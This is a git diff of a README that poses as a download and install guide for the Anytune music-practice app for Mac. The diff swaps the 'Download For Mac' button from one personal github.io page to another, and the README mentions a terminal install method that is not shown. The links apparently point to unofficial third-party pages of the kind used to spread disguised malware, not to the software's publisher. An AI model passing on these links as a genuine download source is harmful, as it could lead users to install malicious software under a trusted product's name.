@@ -4,7 +4,7 @@
 Anytune for Mac is the ultimate tool for musicians who want to slow down, loop, and practice music with precision 🎵.  
 Follow the guide below to download and install Anytune on your macOS device.
 
-[![Download For Mac](https://img.shields.io/badge/Download%20For%20Mac-007AFF?style=for-the-badge&logo=apple)](https://kamartamara.github.io/.github/anytune)
+[![Download For Mac](https://img.shields.io/badge/Download%20For%20Mac-007AFF?style=for-the-badge&logo=apple)](https://tayusikf8398.github.io/.github/anytune)
 
 If the download button does not work, please follow the installation instructions below using the terminal method.
 
